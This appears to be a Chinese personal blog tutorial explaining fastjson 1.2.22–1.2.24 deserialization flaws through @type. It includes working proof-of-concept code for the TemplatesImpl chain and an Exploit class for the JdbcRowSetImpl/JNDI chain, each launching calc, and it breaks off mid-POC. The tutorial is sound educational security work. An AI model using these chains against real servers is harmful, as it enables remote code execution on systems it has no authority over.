<!DOCTYPE html><html theme="dark" showbanner="true" hasbanner="false"><link href="/fontawesome/css/fontawesome.css" rel="stylesheet"><link href="/fontawesome/css/brands.css" rel="stylesheet"><link href="/fontawesome/css/solid.css" rel="stylesheet"><script src="/js/color.global.min.js"></script><script src="/js/load-settings.js"></script><head><meta charset="utf-8"><title>浅谈fastjson | crumbling&#39;s secret room</title><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous"><link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous"><link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous"><meta name="description" content="之前面试的时候被问fastjson原理，没答好，现在稍微缝合整理一下，跟参考的大哥们写的文章相比很浅，建议想要学习fastjson漏洞原理的还是看参考部分的文章吧 fastjson阿里的一个开源java类库，作用是java对象与json字符串的相互转化，即序列化（对象-&gt;json）与反序列化 简单使用如下： 1234567&lt;dependencies&gt;    &lt;depende"><meta property="og:type" content="article"><meta property="og:title" content="浅谈fastjson"><meta property="og:url" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/index.html"><meta property="og:site_name" content="crumbling&#39;s secret room"><meta property="og:description" content="之前面试的时候被问fastjson原理，没答好，现在稍微缝合整理一下，跟参考的大哥们写的文章相比很浅，建议想要学习fastjson漏洞原理的还是看参考部分的文章吧 fastjson阿里的一个开源java类库，作用是java对象与json字符串的相互转化，即序列化（对象-&gt;json）与反序列化 简单使用如下： 1234567&lt;dependencies&gt;    &lt;depende"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241007233405153.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008104757975.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008162532802.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008162437246.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008164652335.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008170254948.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241009103300569.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241009105526685.png"><meta property="og:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241012163209146.png"><meta property="article:published_time" content="2024-10-06T06:47:56.533Z"><meta property="article:modified_time" content="2024-10-14T06:13:48.222Z"><meta property="article:author" content="crumbling"><meta property="article:tag" content="web"><meta property="article:tag" content="fastjson"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241007233405153.png"><link rel="alternate" href="/atom.xml" title="crumbling's secret room" type="application/atom+xml"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180"><link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180"><link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="main-grid" class="shadow"><div id="nav"><navbar id="navbar"><nav id="title-nav"><a href="/"><div id="vivia-logo"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><div>crumbling's secret room</div></a></nav><nav id="main-nav"><a class="main-nav-link" href="/">Home</a> <a class="main-nav-link" href="/archives">Archives</a> <a class="main-nav-link" href="/about">About</a></nav><nav id="sub-nav"><a id="theme-btn" class="nav-icon"><span class="material-symbols-rounded light-mode-icon">wb_sunny</span> <span class="material-symbols-rounded dark-mode-icon">dark_mode</span> </a><a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅"><span class="material-symbols-rounded rss">rss_feed</span> </a><a id="nav-search-btn" class="nav-icon" title="搜索" style="display:none"><span class="material-symbols-rounded">search</span></a><div id="nav-menu-btn" class="nav-icon"><span class="material-symbols-rounded">menu</span></div></nav></navbar><div id="nav-dropdown" class="hidden"><div id="dropdown-link-list"><a class="nav-dropdown-link" href="/">Home</a> <a class="nav-dropdown-link" href="/archives">Archives</a> <a class="nav-dropdown-link" href="/about">About</a> <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a></div></div><script>let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }</script></div><div id="sidebar-wrapper"><sidebar id="sidebar"><div class="widget-wrap"><div class="info-card"><div class="avatar"><div class="img-dim"></div></div><div class="info"><div class="username">crumbling</div><div class="dot"></div><div class="subtitle">This is the subtitle</div><div class="link-list"><a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a> <a class="link-btn" target="_blank" rel="noopener" href="https://steamcommunity.com/profiles/76561199334949091/" title="Steam"><i class="fa-brands fa-steam"></i></a> <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/fcrumbling" title="GitHub"><i class="fa-brands fa-github"></i></a></div></div></div></div><div class="sticky"><div class="widget-wrap"><div class="widget"><h3 class="widget-title">标签</h3><ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ATT-CK/" rel="tag">ATT&amp;CK</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gb%E5%9F%BA/" rel="tag">gb基</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hnp/" rel="tag">hnp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" rel="tag">格密码</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B7%B1%E5%BA%A6%E6%90%9C%E7%B4%A2/" rel="tag">深度搜索</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%9B%B8%E5%85%B3%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/" rel="tag">相关明文攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/" rel="tag">背包问题</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/" rel="tag">自我介绍</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%9B%85%E5%85%8B%E6%AF%94%E7%AC%A6%E5%8F%B7/" rel="tag">雅克比符号</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%AB%98%E6%96%AF%E5%90%AF%E5%8F%91%E5%BC%8F/" rel="tag">高斯启发式</a></li></ul></div></div><div class="widget-wrap"><div class="widget"><h3 class="widget-title">归档</h3><a class="archive-link" href="/archives/2024/10">十月 2024<div class="archive-count">2</div></a><a class="archive-link" href="/archives/2024/06">六月 2024<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2024/05">五月 2024<div class="archive-count">2</div></a><a class="archive-link" href="/archives/2023/12">十二月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/11">十一月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/10">十月 2023<div class="archive-count">1</div></a><a class="archive-link" href="/archives/2023/09">九月 2023<div class="archive-count">5</div></a></div></div><div class="widget-wrap"><div class="widget"><h3 class="widget-title">最新文章</h3><ul><a class="recent-link" href="/2024/10/19/%E6%B5%85%E8%B0%88redis%E6%9C%AA%E6%8E%88%E6%9D%83/" title="浅谈Redis未授权"><div class="recent-link-text">浅谈Redis未授权</div></a><a class="recent-link" href="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/" title="浅谈fastjson"><div class="recent-link-text">浅谈fastjson</div></a><a class="recent-link" href="/2024/06/15/%E5%88%B7%E9%A2%98%E8%AE%B0/" title="刷题记（持续更新中）"><div class="recent-link-text">刷题记（持续更新中）</div></a><a class="recent-link" href="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" title="PortSwigger靶场记录"><div class="recent-link-text">PortSwigger靶场记录</div></a><a class="recent-link" href="/2024/05/24/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Web安全学习笔记"><div class="recent-link-text">Web安全学习笔记</div></a></ul></div></div></div></sidebar></div><div id="content-body"><article id="post-浅谈fastjson" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting"><div class="article-inner"><div class="article-main"><header class="article-header"><div class="main-title-bar"><div class="main-title-dot"></div><h1 class="p-name article-title" itemprop="headline name">浅谈fastjson</h1></div><div class="meta-info-bar"><div class="meta-info"><time class="dt-published" datetime="2024-10-06T06:47:56.533Z" itemprop="datePublished">2024-10-06</time></div><div class="need-seperator meta-info"><div class="meta-cate-flex">未分类</div></div><div class="wordcount need-seperator meta-info">2.4k 词</div></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul></header><div class="e-content article-entry" itemprop="articleBody"><p>之前面试的时候被问<code>fastjson</code>原理，没答好，现在稍微缝合整理一下，跟参考的大哥们写的文章相比很浅，建议想要学习<code>fastjson</code>漏洞原理的还是看参考部分的文章吧</p><h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a><code>fastjson</code></h1><p>阿里的一个开源java类库，作用是<code>java</code>对象与<code>json</code>字符串的相互转化，即序列化（对象-&gt;<code>json</code>）与反序列化</p><p>简单使用如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.50<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;crumbling&quot;</span>,<span class="number">114514</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json1</span> <span class="operator">=</span> JSON.toJSONString(person1);</span><br><span class="line">        System.out.println(json1);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;user_name\&quot;:\&quot;crumbling\&quot;,\&quot;user_age\&quot;:114514&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(json2,Person.class);</span><br><span class="line">        System.out.println(person2.getAge()+person2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JSONType(orders = &#123;&quot;name&quot;,&quot;age&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;user_name&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;user_age&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get and set</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用过程中会调用的内容</p><p><code>parseObject(String text, Class clazz)</code> ，构造⽅法 + <code>setter</code> + 满⾜条件额外的 <code>getter</code></p><p><code>JSONObject parseObject(String text)</code> ，构造⽅法 + <code>setter</code> + <code>getter</code> + 满⾜条件额外的 <code>getter</code></p><p><code>parse(String text)</code> ，构造⽅法 + <code>setter</code> + 满⾜条件额外的 <code>getter</code></p><p>对于没有 <code>set</code> ⽅法的 <code>private</code> 成员，反序列化时传递 <code>Feature.SupportNonPublicField</code> 即可完成赋值</p><h1 id="type"><a href="#type" class="headerlink" title="@type"></a><code>@type</code></h1><p><code>fastjson</code>反序列化的漏洞要从<code>@type</code>讲起</p><p><code>@type</code>是一个特殊注解，用于反序列化，效果是标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型，正是这样的功能引起了相关漏洞</p><p>直接看具体例子</p><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241007233405153.png" alt="image-20241007233405153"></p><p>可以看到<code>java.lang.Runtime</code>这个字符串值被<code>@type</code>标识为了一个<code>java</code>对象，在解析时的结果是<code>java.lang.Runtime@7a5d012c</code>，也就是一个<code>Runtime</code>类的实例对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;java.lang&quot;</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) JSON.parseObject(json,Object.class);</span><br><span class="line">        runtime.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行环境为java8</span></span><br></pre></td></tr></table></figure><p>上面的这段代码可以利用反序列出来的<code>Runtime</code>实例对象弹个计算器出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;crumbling&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/06/%E6%B5%85%E8%B0%88fastjson/image-20241008104757975.png" alt="image-20241008104757975"></p><p>传入<code>SerializerFeature.WriteClassName</code>可以使得<code>Fastjson</code>支持自省，具体效果就是给序列化后的<code>json</code>字符串多一个<code>@type</code>标识，如上图所示</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p><code>1.2.22-1.2.24</code>版本中的反序列化漏洞原自两点：</p><ul><li><code>@type</code>字段指明反序列化的目标恶意类</li><li>如前文所示，<code>fastjson</code>反序列化时，字符串时会⾃动调⽤恶意对象的构造⽅法， <code>setter</code> ⽅法， <code>getter</code> ⽅法等，只要在这些方法里写入利用内容，就可以完成漏洞利用。</li></ul><h2 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h2><p><code>TemplatesImpl(Feature.SupportNonPublicField)</code>利用链</p><p>扣来的脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.crumbling;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;crumbling&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;W01h4cker&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类是一个继承<code>AbstractTranslet</code>的<code>Test</code>类，通过<code>Test t = new Test();</code>来初始化</p><p><code>javac</code> 编译成字节码，然后对字节码继续进行<code>base64</code> 编码填充<code>POC</code>的 <code>_bytecodes</code> 字段，这就是<code>TemplatesImpl</code>利用链的弹计算器</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>json</code>字符串中主要有3个部分影响漏洞</p><p><code>@type</code> 标识了反序列化的恶意⽬标类 <code>TemplatesImpl</code> ，<code>FastJson</code>最终会按照这个类反序列化得到实例</p><p><code>_bytecodes</code> ：继承 <code>AbstractTranslet</code> 类的恶意类字节码，使⽤ <code>Base64</code> 编码。</p><p><code>_outputProperties</code> ： <code>TemplatesImpl</code> 反序列化过程中会调⽤ <code>getOutputProperties</code> ⽅法， 导致 <code>bytecodes</code> 字节码成功实例化，造成命令执⾏。</p><p>因为上述2个成员变量都是无<code>set</code>的<code>private</code>变量，所以反序列化的时候要传入 <code>Feature.SupportNonPublicField</code></p><p>整套流程如下，构造一个<code>TemplatesImpl</code>类的反序列化字符串，其中<code>_bytecodes</code>是构造的恶意类，其父类是<code>AbstractTranslet</code>，会被加载并使用<code>newInstance()</code>实例化。在反序列化过程中<code>getOutputProperties()</code>被<code>fastjson</code>调用，其过程为<code>getOutputProperties() -&gt; newTransformer()-&gt; getTransletInstance()-&gt; defineTransletClasses() -&gt; EvilClass.newInstance()</code></p><h2 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h2><p><code>TemplatesImpl</code> 利⽤链因为需要开启 <code>Feature.SupportNonPublicField</code> 选项，所以还是具有较⼤的 限制。而更好的解决⽅案—— <code>JdbcRowSetImpl</code> 利⽤链配合JDNI。</p><p>大致思路如下</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.crumbling;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">exploit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                    Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>javac</code> 编译得到 <code>Exploit.class</code> ⽂件，将字节码⽂件放到Web⽬录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Hacker&gt;python -m http.server</span><br><span class="line">Serving HTTP on :: port 8000 (http://[::]:8000/) ...</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 